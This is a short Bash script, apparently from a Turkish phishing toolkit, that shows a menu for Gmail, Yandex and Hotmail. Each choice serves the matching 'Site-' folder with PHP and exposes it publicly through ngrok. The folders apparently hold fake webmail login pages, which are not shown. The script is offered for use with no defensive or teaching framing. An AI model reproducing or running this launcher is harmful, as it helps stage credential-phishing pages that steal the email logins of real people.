#!/bin/bash

#Code: MR.Neowise
#Youtube : Serhat Türk
clear
echo -e  "


\e[35m     ((( #Cyber Turkish  #MR.Neowise )))



\e[31m[01]\e[32m Gmail
\e[31m[02]\e[32m Yandex
\e[31m[03]\e[32m Hotmail


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[49m"
read -p "İşlem Numarasını Giriniz: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: mail01"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Site-gmail/
	php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: mail02"
	sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-yandex/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 3 || $islem == 03 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: mail03"
	sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-hotmail/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash hasaki.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mMR.Neowise İyi Günler Diler 🇹🇷 "
exit 1
else
echo ""
echo -e "\e[31m Hata! Code Numarasını Kontrol Ediniz...."
sleep 3
clear
bash start.sh
fi
